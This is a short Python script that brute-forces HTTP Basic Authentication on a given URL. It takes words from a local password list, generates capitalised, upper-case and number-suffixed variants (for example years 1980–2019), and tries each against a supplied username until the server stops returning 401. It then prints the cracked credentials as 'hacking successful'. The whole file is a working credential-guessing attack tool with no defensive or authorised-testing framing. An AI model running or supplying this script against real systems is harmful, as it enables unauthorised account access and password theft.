#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse


NUMBERS = [i for i in range(0, 20)]
NUMBERS += [i for i in range(1980, 2020)]
NUMBERS += [i for i in range(70, 100)]


def generate_variations(baseword):
    yield (baseword)
    yield (baseword.capitalize())
    yield (baseword.upper())
    for n in NUMBERS:
        yield (f"{baseword}{n}")
        yield ("{}{}".format(baseword.capitalize(), n))
        yield ("{}{}".format(baseword.upper(), n))


def generate_passwords(user, maxlen):
    with open("passwords.list", "r") as pwd_file:
        for line in pwd_file:
            if line.startswith("#"):
                continue
            base = line.strip()
            for pwd in generate_variations(base):
                yield pwd


def test(url, user, pwd):
    code = requests.get(url, auth=(user, pwd)).status_code
    print(f"{user}, {pwd} --> {code}")
    return code != 401


def hack(url, user, maxlen=10):
    for pwd in generate_passwords(user, maxlen):
        if test(url, user, pwd):
            return user, pwd
    print("hacking failed...")
    return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("--user")

    args = parser.parse_args()
    credentials = hack(args.url, args.user)
    if credentials is not None:
        print(f"hacking successful: {credentials}")
